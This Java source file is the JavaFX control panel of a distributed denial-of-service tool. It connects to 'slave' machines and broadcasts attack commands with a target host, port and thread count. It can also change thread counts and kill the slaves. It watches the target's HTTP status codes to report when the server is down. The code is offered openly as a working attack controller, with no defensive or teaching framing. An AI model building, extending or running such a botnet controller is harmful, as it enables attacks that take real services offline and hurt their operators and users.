package application;
	
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.swing.JOptionPane;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.event.EventHandler;
import javafx.stage.Stage;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.BorderPane;
import javafx.scene.paint.Color;
import javafx.scene.paint.CycleMethod;
import javafx.scene.paint.LinearGradient;
import javafx.scene.paint.Stop;
import javafx.scene.shape.Circle;
import javafx.fxml.FXMLLoader;
import main.socket_connector;





public class Main extends Application {
	
	// this socket connector class will be in charge of connecting to the client machines 
	//	facilitate the raid process.
	socket_connector servercon ;
	
	
	TextField host;
	TextField port ;
	Label message ; 
	Button start ;
	TextField numberOfThreads ;
	Button submit ;
	Label statusResult ;
	Circle statusColor;
	Button KillSlaves;
	Label activeSlaves;
	TextArea logArea ;
	Scene scene ;
	BorderPane root ;
	
	
	// values 
	
	String hostAddress ;
	int portVal  ;
	int threadsCount ; 
	String logMessageToBeAppend ;
	int slavesCount ;
	public boolean running = false; 
	
	AtomicBoolean sendData = new AtomicBoolean(true);
	
	// updatingLoop this method updates the server in 
	//	3 seconds time interval.
	public void updatingLoop() {
		ScheduledExecutorService service = Executors.newScheduledThreadPool(10);
		service.scheduleAtFixedRate( ()->{
			Platform.runLater(new Runnable() {
				@Override 
				public void run() {
					activeSlaves.setText(""+servercon.clients.size());
					Iterator iterator = servercon.responses.entrySet().iterator();
					int key =0;
					int value=0 ; 
					ArrayList<Integer[]>  codeResults = servercon.getStatus();
					for(int c =0;c < codeResults.size() ;c++) {
						Integer[] vals = codeResults.get(c);
						if(key < vals[0]) {
							key=vals[0];
							value = vals[1];
						}
					}
					if(key >=500) {
						statusColor.setFill(
								new LinearGradient(
						        0, 0, 1, 1, true,                      //sizing
						        CycleMethod.NO_CYCLE,                  //cycling
						        new Stop(0, Color.web("#ff0000")),     //colors
						        new Stop(1, Color.web("#ff0000"))));
						statusResult.setText(key+" SERVER IS << DOWN >>");
					}else if( key >=400 ) {
						statusColor.setFill(
								new LinearGradient(
						        0, 0, 1, 1, true,                      //sizing
						        CycleMethod.NO_CYCLE,                  //cycling
						        new Stop(0, Color.web("#00ffff")),     //colors
						        new Stop(1, Color.web("#00ffff"))));
						statusResult.setText(key+ " Resource << NOT FOUND >>");
					}else if(key >=200) {
						statusColor.setFill(
								new LinearGradient(
						        0, 0, 1, 1, true,                      //sizing
						        CycleMethod.NO_CYCLE,                  //cycling
						        new Stop(0, Color.web("#00ff00")),     //colors
						        new Stop(1, Color.web("#00ff00"))));
						statusResult.setText(key+ " << OK >>");
					}else {
						statusColor.setFill(
								new LinearGradient(
						        0, 0, 1, 1, true,                      //sizing
						        CycleMethod.NO_CYCLE,                  //cycling
						        new Stop(0, Color.web("#000000")),     //colors
						        new Stop(1, Color.web("#000000"))));
						statusResult.setText(" << NO RESULT >> ");
					}
					for(Integer[] val : codeResults) {
						logArea.appendText(  System.currentTimeMillis() +"          Status Code : "+val[0] +" : Occurance : "+  val[1] +"\n");
					}
				}
			});
        }, 0, 500, TimeUnit.MILLISECONDS);
	}
	
	@Override
	public void start(Stage primaryStage) {
		try {
			root = (BorderPane)FXMLLoader.load(getClass().getResource("Sample.fxml"));
			scene = new Scene(root,740,630);
			scene.getStylesheets().add(getClass().getResource("application.css").toExternalForm());
			primaryStage.setScene(scene);
			primaryStage.setResizable(false);
			primaryStage.setOnCloseRequest(event ->{
				int success = JOptionPane.showConfirmDialog(null, "Are you sure do you want to close the window ?", "Exit DDOS", 0, 0, null );
				if(success==0) {
					System.exit(0);
				}else {
					event.consume();
				}
			});
			primaryStage.show();
		} catch(Exception e) {
			JOptionPane.showMessageDialog( null , "This is the message "+ e.getMessage());	
			return ; 
		}
		initializeData();
		servercon = new socket_connector();
		servercon.start();
		updatingLoop();
	}
	public void initializeData() {
		this.host= (TextField)scene.lookup("#host");
		this.port = (TextField)scene.lookup("#port");
		this.numberOfThreads = (TextField) scene.lookup("#threads_count");
		this.logArea = (TextArea) scene.lookup("#log_area");
		this.start= (Button)scene.lookup("#btn_start");
		this.message = (Label)scene.lookup("#msg_info");
		this.statusColor = ( Circle )scene.lookup("#btn_status");
		System.out.println( this.statusColor );
		this.activeSlaves = (Label)scene.lookup("#attackers_count");	
		this.statusResult = (Label)scene.lookup("#status_res");
		this.KillSlaves = (Button) scene.lookup("#salves_button");
		this.KillSlaves.setOnMouseClicked(new EventHandler<MouseEvent>() {
			 public void handle(MouseEvent e) { 
				int success = JOptionPane.showConfirmDialog(null, "Are you sure do you want to Kill slave clients ?", "Kill Slaves", 0, 0, null );
				if(success==0) {
					String attackMessage = "cls;";
					 servercon.broadcastMessage(attackMessage);
				}else {
					return;
				}
			 }
		});
		start.setOnMouseClicked(new EventHandler<MouseEvent>() {
		        public void handle(MouseEvent e) {
		        	if(start.getText().equalsIgnoreCase("Start")) {
		        		message.setTextFill(Color.color(1, 0, 0));
		        		hostAddress = host.getText();
		        		hostAddress.trim();
		        		try {
		        			portVal = Integer.parseInt(port.getText());
		        		}catch(Exception ex ) {
			        		message.setText(!hostAddress.equalsIgnoreCase("") ? "Invalid Port " : "Invalid Values "  );
			        		return ;
		        		}
		        		if(hostAddress.equals("") && portVal == 0) {
		        			message.setText("Please fill host and port Entries ");
		        			return ;
		        		}else if(hostAddress.equals("")) {
	        				message.setText("Please fill Host");
	        				return ;
		        		}else if(portVal == 0){
	        				message.setText("Please fill Valid Port number ");
	        				return ;
	        			}
		        		if(!validateIP(hostAddress)) {
	        				message.setText("Invalid IP Address");
	        				return;
	        			}
		        		try {
		        			threadsCount = Integer.parseInt( numberOfThreads.getText().trim());
		        			if(threadsCount <0 ) {
		        				message.setText("Invalid Threads Quantity Value \n It has to be non negative Integer value ");
		        				return ;
		        			}
		        		}catch(Exception exx ){
		        			message.setText(" Invalid threads quantity ... ");
	        				return ;
		        		}
		        		
		        		message.setText("Attack in Progress ....");
		        		message.setTextFill(Color.color(0, 0, 1));
		        		running=true;
		        		start.setText("Stop");
		        		// Attack Message 
		        		// cl.writeMessage("st;127.0.0.1;8080;/distr.png;500");
		        		String attackMessage = "st;"+hostAddress+";"+portVal +";/;"+threadsCount;
		        		servercon.broadcastMessage(attackMessage);
		        	}else {
		        		start.setText("Start");
		        		message.setText("Attack ceased .. ");		
		        	}
		        }
		});
		this.submit = (Button)scene.lookup("#btn_submit");
		this.submit.setOnMouseClicked(new EventHandler<MouseEvent>() {
		        public void handle(MouseEvent e) {
		        	try {
		        		threadsCount  = Integer.parseInt(numberOfThreads.getText());
		        		if(threadsCount <0 ) {
		        			message.setText("Invalid Threads/Process value ");
		        			message.setTextFill(Color.color(1, 0, 0));
		        			return ; 
		        		}
		        	}catch(Exception exx ) {
		        		message.setText("Invalid Input ");
	        			message.setTextFill(Color.color(1, 0, 0));
	        			return ; 
		        	}
		        	message.setText(" Thread quantity change request Accepted!");
        			message.setTextFill(Color.color(0, 0, 1));
        			servercon.broadcastMessage("ts;"+ threadsCount+"\n");
        			return ; 
		        }
		});
	}
	
	// ValidateIP  method to check teh IP address ... 
	public boolean validateIP(String ipAddress ) {
		ipAddress = ipAddress.trim();
		System.out.println(ipAddress);
		String[] vals = ipAddress.split("\\.");
		if( vals.length != 4 ) {
			return false ;
		}
		for(int a=0;a < 4; a++) {
			try {
				int val = Integer.parseInt(vals[a]);
				if(val <0  || val > 256) {
					return false ; 
				}
			}catch(Exception e ) {
				return false ; 
			}
		}
		return true ;
	}
	
	public static void main(String[] args) {
		launch(args);
	}
}
